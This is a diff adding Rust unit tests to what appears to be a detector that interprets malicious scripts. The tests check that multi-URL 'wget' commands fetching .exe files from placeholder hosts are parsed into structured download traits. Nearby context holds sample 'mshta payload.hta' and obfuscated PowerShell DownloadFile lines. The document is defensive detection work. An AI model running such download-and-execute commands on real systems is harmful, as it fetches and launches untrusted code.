@@ -19554,6 +19554,29 @@ mshta payload.hta"#,
             .modified_filesystem
             .contains_key(r#"c:\temp\payload.bin"#));
     }
+
+    #[test]
+    fn wget_multiple_direct_urls_emit_structured_downloads() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"wget https://wget-multi.example/a.exe https://wget-multi.example/b.exe"#,
+            &mut env,
+        );
+
+        for expected in [
+            "https://wget-multi.example/a.exe",
+            "https://wget-multi.example/b.exe",
+        ] {
+            assert!(
+                env.traits.iter().any(|t| matches!(
+                    t,
+                    Trait::Download { src, dst, .. } if src == expected && dst.is_none()
+                )),
+                "wget multi-URL source {expected} not structured: {:?}",
+                env.traits
+            );
+        }
+    }
 }
 
 #[cfg(test)]
@@ -40710,6 +40733,45 @@ powershll.exe -mmand"(Nw-ject-ypame Sstem.Net.Welint).Dwnloadile('https://raw.ex
         assert!(
             has,
             "no structured schemeless wget Download: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn wget_multiple_urls_in_deob_text_emit_structured_downloads() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"wget https://wget-multi-deob.example/a.exe https://wget-multi-deob.example/b.exe"#,
+            &mut env,
+        );
+
+        for expected in [
+            "https://wget-multi-deob.example/a.exe",
+            "https://wget-multi-deob.example/b.exe",
+        ] {
+            assert!(
+                env.traits.iter().any(|t| matches!(
+                    t,
+                    Trait::Download { src, dst, .. } if src == expected && dst.is_none()
+                )),
+                "wget deob-text multi-URL source {expected} not structured: {:?}",
+                env.traits
+            );
+        }
+        let generic_count = env
+            .traits
+            .iter()
+            .filter(|t| {
+                matches!(
+                    t,
+                    Trait::DownloadInDeobText { src, .. }
+                        if src.contains("wget-multi-deob.example")
+                )
+            })
+            .count();
+        assert_eq!(
+            generic_count, 0,
+            "wget multi-URL deob text left generic duplicates: {:?}",
             env.traits
         );
     }
